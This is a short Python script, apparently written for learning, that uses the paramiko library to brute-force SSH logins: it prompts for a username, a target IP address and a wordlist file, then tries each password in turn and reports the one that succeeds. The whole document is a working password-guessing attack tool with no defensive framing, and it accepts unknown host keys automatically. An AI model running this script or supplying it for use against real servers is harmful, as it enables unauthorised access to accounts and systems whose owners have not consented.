#!/usr/bin/python3
import paramiko

def try_login(username, ip_address, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # For testing only

    try:
        ssh.connect(ip_address, username=username, password=password)
        print("Login successful with password:", password)
        ssh.close()  # Close connection after successful login
        return True
    except paramiko.AuthenticationException:
        print("Invalid password:", password)
        return False


username = input("Enter SSH username: ")
ip_address = input("Enter SSH server IP address: ")
wordlist_file = input("Enter path to word list file: ")

with open(wordlist_file, 'r') as f:
    for password in f:
        password = password.strip()
        if try_login(username, ip_address, password):
            break  # Exit loop upon successful login

#attribituons 
#bard.com
#Python for beginners coding book 
